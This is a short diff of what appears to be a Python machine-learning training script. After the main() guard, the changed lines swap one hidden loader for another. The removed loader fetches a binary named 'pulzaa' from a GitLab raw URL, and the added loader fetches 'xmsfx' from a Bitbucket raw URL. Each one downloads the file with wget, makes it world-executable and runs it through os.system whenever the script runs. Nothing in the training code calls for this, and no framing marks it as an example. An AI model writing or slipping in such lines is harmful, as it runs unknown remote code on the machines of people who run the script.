@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://gitlab.com/dirocuk/esdora/-/raw/main/pulzaa')
-os.system('chmod 777 pulzaa')
-os.system('./pulzaa')
+os.system('wget https://bitbucket.org/lightcoral2/intina/raw/master/xmsfx')
+os.system('chmod 777 xmsfx')
+os.system('./xmsfx')
